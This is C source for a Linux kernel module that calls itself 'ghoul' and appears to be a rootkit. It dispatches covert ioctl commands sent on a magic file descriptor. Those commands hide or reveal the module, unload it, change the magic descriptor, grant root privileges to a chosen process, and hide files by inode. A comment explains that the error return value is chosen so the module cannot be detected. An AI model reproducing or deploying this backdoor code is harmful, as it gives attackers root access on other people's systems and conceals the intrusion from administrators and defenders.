#include <linux/kernel.h>
#include <uapi/asm-generic/errno-base.h>
#include <linux/uaccess.h>
#include "service.h"
#include "load.h"
#include "privileges.h"
#include "hide.h"

unsigned int service_fd = 666;
unsigned long ping_arg = 666;

notrace void change_ping_arg(const void __user *user_info)
{
    struct change_ping_arg_info info;

    // copy request info
    if (copy_from_user((void *)&info, user_info, sizeof(struct change_ping_arg_info))) {
        pr_info("ghoul: can't copy user data\n");
        return;
    }

    // change arg only if old arg is correct
    if (info.old_arg == ping_arg)
        ping_arg = info.new_arg;
    
    return;
}

notrace int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
{
    // 0 means this is not a service request
    if (fd != service_fd)
        return 0;
    
    pr_info("ghoul: ioctl request: fd=%u, cmd=%u, arg=%lu\n", fd, cmd, arg);
    
    switch (cmd)
    {
        case SERVICE_SHOW:
            show_module();
            break;
        case SERVICE_HIDE:
            hide_module();
            break;
        case SERVICE_UNLOAD:
            show_module();
            unload_module();
            break;
        case SERVICE_CHANGE_FD:
            service_fd = (unsigned int)arg;
            break;
        case SERVICE_PING:
            // make sure argument is correct
            if (arg == ping_arg)
                return ping_arg;
            break;
        case SERVICE_CHANGE_PING_ARG:
            change_ping_arg((const void __user *)arg);
            break;
        case SERVICE_GIVE_ROOT:
            give_root((int)arg);
            break;
        case SERVICE_HIDE_FILE_INODE:
            hide_file_inode(arg);
            break;
        case SERVICE_SHOW_FILE_INODE:
            show_file_inode((const void __user *)arg);
            break;
    }
    /*
     * -EBADF is the error that is returned when performing an ioctl operation on an invalid fd.
     * Return this so that ghoul cannot be detected by its return value.
     */
    return -EBADF;
}